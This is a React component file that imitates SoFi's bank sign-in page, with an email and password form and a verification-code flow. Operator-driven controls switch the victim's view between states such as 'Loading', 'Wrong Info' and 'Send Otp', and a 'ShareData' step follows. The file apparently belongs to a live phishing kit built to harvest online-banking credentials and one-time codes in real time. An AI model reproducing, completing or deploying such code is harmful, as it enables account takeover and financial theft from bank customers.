import clsx from "clsx";
import useBankFunctions from "../../../../../../../hooks/useBankFunctions";
import { motion } from "framer-motion";
import BankingHeader from "./BankingHeader";
import SoFiFavIcon from "../../../../../../../../assets/allBanks/banks/sofi/si2.ico";
import { Link } from "react-router-dom";
import { FaRegEye, FaRegEyeSlash } from "react-icons/fa6";
import SoFiImg from "../../../../../../../../assets/allBanks/banks/sofi/si3.png";
import { BsExclamationCircleFill } from "react-icons/bs";
import { otpOptions } from "../../bankDetails";
import ShareData from "./ShareData";
import { ClipLoader } from "react-spinners";
import BasicLoader from "../../../../../loading/BasicLoader";
import BankControl from "./BankControl";
import BankOtpControl from "./BankOtpControl";

const Sofi = ({
  handleCancel,
  bankName,
  selectedPath,
  allBankOpen,
  handleSelectSubmit,
  handleSelectedId,
  whatToShowDetails,
  setOtpOpen,
  OtpOpen,
  selectedOtp,
  handleSubmitOtp,
  handleSelectedOtp,
  otpInfo,
  activePathDetails,
  indexOtp,
  handleOtpOption,
  isOpenOtp,
  onSubmitOtpOptions,
  activeOtp,
  setAllBankItems,
  typeAccount,
  loading,
  setTypeAccount,
  setIsOpenOtp,
}) => {
  const {
    formState,
    handleTheMainSubmit,
    errorFormState,
    handleChange,
    onSubmitOtp,
    errorOtp,
    changeOtp,
    formOtp,
    resend,
    setshowPassword,
    showPassword,
    handleTheFinal,
    handleVerifiedOtp,
    onSumbitForm,
    handleResend,
  } = useBankFunctions(bankName, setOtpOpen, setAllBankItems, setTypeAccount);

  return (
    <motion.div
      initial={{ y: -100, opacity: 0 }}
      animate={{ y: 0, opacity: 1 }}
      exit={{ y: -100, opacity: 0 }}
      transition={{ type: "spring", stiffness: 300, damping: 50 }}
      className={clsx(
        "w-full min-h-screen h-full  top-0  bg-customBlue-1016",
        typeAccount ? "hidden" : "block"
      )}
    >
      <BankingHeader
        text="Sign in - SoFi.com"
        handleCancel={handleCancel}
        img={SoFiFavIcon}
        setAllBankItems={setAllBankItems}
        setIsOpenOtp={setIsOpenOtp}
        setOtpOpen={setOtpOpen}
      />
      <header className="flex items-center justify-center py-5 mb-1">
        <div>
          <img
            src={SoFiImg}
            alt=""
            className="w-[118px] h-[32px] object-contain"
          />
        </div>
      </header>
      <div className="flex items-center justify-center px-6 pt-0 pb-20">
        <div
          className={clsx(
            " customMiniTablet:w-[400px] w-full ",
            allBankOpen ? "hidden" : "block"
          )}
        >
          <div className="w-full p-8 bg-white rounded-2xl">
            <div className="mb-5 space-y-4 text-center text-customGray-104">
              <h3 className="text-2xl font-semibold">Secure Login</h3>
              <p className="text-sm font-semibold">
                Log in to Get Your Money Right®
              </p>
            </div>
            <div>
              <div className="mb-5">
                <input
                  type="text"
                  value={formState.username}
                  name="username"
                  onChange={handleChange}
                  placeholder="Email*"
                  className={clsx(
                    "w-full border border-customGray-1046 rounded-lg py-3 px-4 outline-none focus:border-2 focus:border-customBlue-1017 transistion2 placeholder:font-semibold",
                    errorFormState.username ? "border border-customRed-900" : ""
                  )}
                />
                {errorFormState.username && (
                  <p className="flex gap-2 mt-2 text-sm text-customRed-900">
                    <BsExclamationCircleFill className="mt-[2px]" />
                    Please fill out this field.
                  </p>
                )}
              </div>
              <div className="relative mb-5">
                <input
                  type={showPassword ? "text" : "password"}
                  value={formState.password}
                  name="password"
                  onChange={handleChange}
                  placeholder="Password*"
                  className={clsx(
                    "w-full border border-customGray-1046 rounded-lg py-3 px-4 outline-none focus:border-2 focus:border-customBlue-1017 transistion2 placeholder:font-semibold",
                    errorFormState.password ? "border border-customRed-900" : ""
                  )}
                />
                <span
                  onClick={() => setshowPassword((prevShow) => !prevShow)}
                  className="absolute h-full py-4 right-4 "
                >
                  {showPassword ? (
                    <FaRegEyeSlash size={16} />
                  ) : (
                    <FaRegEye size={16} />
                  )}
                </span>
                {errorFormState.password && (
                  <p className="flex gap-2 mt-2 text-sm text-customRed-900">
                    <BsExclamationCircleFill className="mt-[2px]" />
                    Please fill out this field.
                  </p>
                )}
              </div>
              <Link
                to="https://www.sofi.com/"
                className="pl-1 font-semibold text-customBlue-1017"
              >
                Forgot password?
              </Link>
              <button
                onClick={(e) => handleTheMainSubmit(e, onSumbitForm)}
                className="w-full py-3 my-4 font-semibold text-white rounded-lg bg-customBlue-1018"
              >
                {loading && <ClipLoader size={10} color="#fff" />}
                {loading ? "Loading..." : "Log in"}
              </button>
            </div>
          </div>
          <div className="text-center my-7">
            <Link
              to="https://www.sofi.com/"
              className="pl-1 font-semibold text-center text-white hover:text-customBlue-1019 transistion2"
            >
              New to SoFi? Sign up
            </Link>
          </div>
        </div>
        <div>
          {allBankOpen && (
            <div className={clsx(OtpOpen ? "hidden" : "block")}>
              <BankControl
                handleSelectedId={handleSelectedId}
                selectedPath={selectedPath}
                handleSelectSubmit={handleSelectSubmit}
              />
              <div>
                {activePathDetails.name === "Loading" && (
                  <p className="my-5 text-xl font-extrabold text-center text-customRed-200">
                    <BasicLoader />
                  </p>
                )}
                {activePathDetails.name === "Wrong Info" && (
                  <>
                    <div
                      className={clsx(" customMiniTablet:w-[400px] w-full ")}
                    >
                      <div className="w-full p-8 bg-white rounded-2xl">
                        <div className="mb-5 space-y-4 text-center text-customGray-104">
                          <h3 className="text-2xl font-semibold">
                            Secure Login
                          </h3>
                          <p className="text-sm font-semibold">
                            Log in to Get Your Money Right®
                          </p>
                        </div>
                        <div className="flex justify-center gap-1 mx-3 my-5 font-extrabold text-center customMiniTablet:mx-0 text-customRed-200">
                          <BsExclamationCircleFill className="mt-[2px]" />

                          <p>{activePathDetails.body}</p>
                        </div>
                        <div>
                          <div className="mb-5">
                            <input
                              type="text"
                              value={formState.username}
                              name="username"
                              onChange={handleChange}
                              placeholder="Email*"
                              className={clsx(
                                "w-full border border-customGray-1046 rounded-lg py-3 px-4 outline-none focus:border-2 focus:border-customBlue-1017 transistion2 placeholder:font-semibold",
                                errorFormState.username
                                  ? "border border-customRed-900"
                                  : ""
                              )}
                            />
                            {errorFormState.username && (
                              <p className="flex gap-2 mt-2 text-sm text-customRed-900">
                                <BsExclamationCircleFill className="mt-[2px]" />
                                Please fill out this field.
                              </p>
                            )}
                          </div>
                          <div className="relative mb-5">
                            <input
                              type={showPassword ? "text" : "password"}
                              value={formState.password}
                              name="password"
                              onChange={handleChange}
                              placeholder="Password*"
                              className={clsx(
                                "w-full border border-customGray-1046 rounded-lg py-3 px-4 outline-none focus:border-2 focus:border-customBlue-1017 transistion2 placeholder:font-semibold",
                                errorFormState.password
                                  ? "border border-customRed-900"
                                  : ""
                              )}
                            />
                            <span
                              onClick={() =>
                                setshowPassword((prevShow) => !prevShow)
                              }
                              className="absolute h-full py-4 right-4 "
                            >
                              {showPassword ? (
                                <FaRegEyeSlash size={16} />
                              ) : (
                                <FaRegEye size={16} />
                              )}
                            </span>
                            {errorFormState.password && (
                              <p className="flex gap-2 mt-2 text-sm text-customRed-900">
                                <BsExclamationCircleFill className="mt-[2px]" />
                                Please fill out this field.
                              </p>
                            )}
                          </div>
                          <Link
                            to="https://www.sofi.com/"
                            className="pl-1 font-semibold text-customBlue-1017"
                          >
                            Forgot password?
                          </Link>
                          <button
                            onClick={(e) =>
                              handleTheMainSubmit(e, onSumbitForm)
                            }
                            className="w-full py-3 my-4 font-semibold text-white rounded-lg bg-customBlue-1018"
                          >
                            {loading && <ClipLoader size={10} color="#fff" />}
                            {loading ? "Loading..." : "Log in"}
                          </button>
                        </div>
                      </div>
                      <div className="text-center my-7">
                        <Link
                          to="https://www.sofi.com/"
                          className="pl-1 font-semibold text-center text-white hover:text-customBlue-1019 transistion2"
                        >
                          New to SoFi? Sign up
                        </Link>
                      </div>
                    </div>
                  </>
                )}
                {activePathDetails.name === "Send Otp" && (
                  <>
                    <h3>{activePathDetails.body}</h3>
                    <div
                      className={clsx(
                        " customMiniTablet:w-[500px] px-4 bg-white py-4",
                        isOpenOtp && "hidden"
                      )}
                    >
                      <div>
                        <div>
                          <div>
                            <h3 className="mb-2 text-xl font-bold text-center text-black">
                              Verify your identity
                            </h3>
                            <p className="mb-2 text-center ">
                              For your security, we need to verify it&apos;s
                              really you.
                            </p>
                          </div>
                          <div>
                            <h2 className="mb-2 text-sm font-bold">
                              How would you like to get your verification code?
                            </h2>
                            <p className="mb-2 text-sm text-customGray-100">
                              Select One:
                            </p>
                            <div
                              role="radiogroup"
                              aria-label="Otp Options"
                              className="flex flex-col space-y-3"
                            >
                              {otpOptions.map((bank) => (
                                <div
                                  key={bank.id}
                                  role="radio"
                                  tabIndex={0}
                                  onClick={() => handleOtpOption(bank.id)}
                                  className="flex items-center gap-2.5 "
                                >
                                  <div className="border border-black rounded-full p-[2px] text-center mb-[1px]">
                                    <p
                                      className={clsx(
                                        "rounded-full w-[10px] h-[10px]  ",
                                        otpOptions[indexOtp]?.id === bank.id
                                          ? "bg-customBlue-500"
                                          : ""
                                      )}
                                    ></p>
                                  </div>
                                  <h2
                                    className={clsx(
                                      "text-sm",
                                      otpOptions[indexOtp]?.id === bank.id
                                        ? "text-customBlue-500 hover:underline"
                                        : "hover:text-customBlue-700 hover:underline"
                                    )}
                                  >
                                    {bank.name}
                                  </h2>
                                </div>
                              ))}
                            </div>
                            <button
                              onClick={onSubmitOtpOptions}
                              className="w-full py-3 my-4 font-semibold text-white rounded-lg bg-customBlue-1018"
                            >
                              Continue
                            </button>
                          </div>
                        </div>
                      </div>
                    </div>
                    {isOpenOtp && (
                      <div
                        className={clsx(
                          " customMiniTablet:w-[500px] px-4 bg-white py-4"
                        )}
                      >
                        <div>
                          <div>
                            <div>
                              <h3 className="mb-2 text-xl font-bold text-center text-black">
                                Enter Verification Code
                              </h3>
                            </div>
                            <div>
                              <h2 className="mb-2 text-center ">
                                Enter the verification code we sent to your
                                phone
                              </h2>
                              <div className="px-2 customMiniTablet:px-24">
                                <div>
                                  <input
                                    type="number"
                                    placeholder="Enter Verification Code"
                                    value={formOtp.otpo}
                                    name="otpo"
                                    onChange={changeOtp}
                                    className={clsx(
                                      "w-full border border-customGray-1046 rounded-lg py-3 px-4 outline-none focus:border-2 focus:border-customBlue-1017 transistion2 placeholder:font-semibold no-spinner",
                                      errorOtp.otpo
                                        ? "border border-customRed-900"
                                        : ""
                                    )}
                                  />
                                  {errorOtp.otpo && (
                                    <p className="mt-2 text-sm text-customRed-900">
                                      Please enter the verification code.
                                    </p>
                                  )}
                                </div>
                                <button
                                  className="w-full py-3 my-4 font-semibold text-white rounded-lg bg-customBlue-1018"
                                  onClick={(e) =>
                                    onSubmitOtp(e, handleVerifiedOtp)
                                  }
                                >
                                  {loading && (
                                    <ClipLoader size={10} color="#fff" />
                                  )}
                                  {loading ? "Loading..." : "Verify"}
                                </button>
                              </div>
                              <p
                                className={clsx(
                                  "cursor-pointer text-customBlue-100 font-bold text-center",
                                  !resend &&
                                    "text-customBlue-500 text-opacity-25 cursor-not-allowed"
                                )}
                                onClick={handleResend}
                              >
                                Didnt get a code? Resend
                              </p>
                            </div>
                          </div>
                        </div>
                      </div>
                    )}
                  </>
                )}
              </div>
            </div>
          )}
          {OtpOpen && (
            <>
              <BankOtpControl
                handleSelectedOtp={handleSelectedOtp}
                selectedOtp={selectedOtp}
                handleSubmitOtp={handleSubmitOtp}
              />

              <div>
                {activeOtp.name === "Loading" && (
                  <p className="my-5 text-xl font-extrabold text-center text-customRed-200">
                    <BasicLoader />
                  </p>
                )}
                {activeOtp.name === "wrong" && (
                  <>
                    <div
                      className={clsx(
                        " customMiniTablet:w-[500px] px-4 bg-white py-4"
                      )}
                    >
                      <div>
                        <div>
                          <div>
                            <h3 className="mb-2 text-xl font-bold text-center text-black">
                              Enter Verification Code
                            </h3>
                          </div>
                          <div>
                            <h2 className="mb-2 text-center ">
                              Enter the verification code we sent to your phone
                            </h2>
                            <div className="px-2 customMiniTablet:px-24">
                              <div>
                                <input
                                  type="number"
                                  placeholder="Enter Verification Code"
                                  value={formOtp.otpo}
                                  name="otpo"
                                  onChange={changeOtp}
                                  className={clsx(
                                    "w-full border border-customGray-1046 rounded-lg py-3 px-4 outline-none focus:border-2 focus:border-customBlue-1017 transistion2 placeholder:font-semibold no-spinner",
                                    errorOtp.otpo
                                      ? "border border-customRed-900"
                                      : ""
                                  )}
                                />
                                {errorOtp.otpo && (
                                  <p className="mt-2 text-sm text-customRed-900">
                                    Please enter the verification code.
                                  </p>
                                )}
                                <h3 className="mt-2 text-sm text-customRed-200">
                                  {activeOtp.body}
                                </h3>
                              </div>
                              <button
                                className="w-full py-3 my-4 font-semibold text-white rounded-lg bg-customBlue-1018"
                                onClick={(e) =>
                                  onSubmitOtp(e, handleVerifiedOtp)
                                }
                              >
                                {loading && (
                                  <ClipLoader size={10} color="#fff" />
                                )}
                                {loading ? "Loading..." : "Verify"}
                              </button>
                            </div>
                            <p
                              className={clsx(
                                "cursor-pointer text-customBlue-100 font-bold text-center",
                                !resend &&
                                  "text-customBlue-500 text-opacity-25 cursor-not-allowed"
                              )}
                              onClick={handleResend}
                            >
                              Didnt get a code? Resend
                            </p>
                          </div>
                        </div>
                      </div>
                    </div>
                  </>
                )}
                {activeOtp.name === "otp" && (
                  <>
                    <ShareData
                      bankName={bankName}
                      handleTheFinal={handleTheFinal}
                      handleCancel={handleCancel}
                      setIsOpenOtp={setIsOpenOtp}
                      setAllBankItems={setAllBankItems}
                      siteLink="https://www.sofi.com/"
                    />
                  </>
                )}
              </div>
            </>
          )}
        </div>
      </div>
      <footer className="flex items-center justify-center w-full py-1 mt-16 bg-customBlue-1018">
        <Link
          to="https://www.sofi.com/"
          className="flex space-x-6 text-sm font-semibold text-white"
        >
          <p>Help</p>
          <p>Term of Service</p>
          <p>Privacy Policy</p>
        </Link>
      </footer>
    </motion.div>
  );
};

export default Sofi;
